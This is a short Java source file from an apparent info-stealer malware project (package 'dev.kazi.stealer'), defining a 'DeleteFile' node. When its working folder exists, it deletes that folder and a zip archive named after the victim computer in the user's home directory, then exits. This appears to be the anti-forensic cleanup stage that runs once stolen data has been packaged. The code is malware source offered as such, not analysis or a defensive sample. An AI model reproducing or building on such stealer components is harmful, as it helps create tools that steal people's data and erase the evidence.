package dev.kazi.stealer.node.nodes.file;

import java.io.File;
import dev.kazi.stealer.node.Category;
import dev.kazi.stealer.node.Node;

public class DeleteFile extends Node {

    public DeleteFile() {
        super(Category.FILE);
    }
    
    @Override
    public void createNode() {
        if (this.getFolder().exists()) {
            final File zip = new File(System.getProperty("user.home") + "\\" + System.getenv("COMPUTERNAME") + ".zip");
            this.getFolder().delete();
            zip.delete();
            System.exit(0);
        }
    }
}
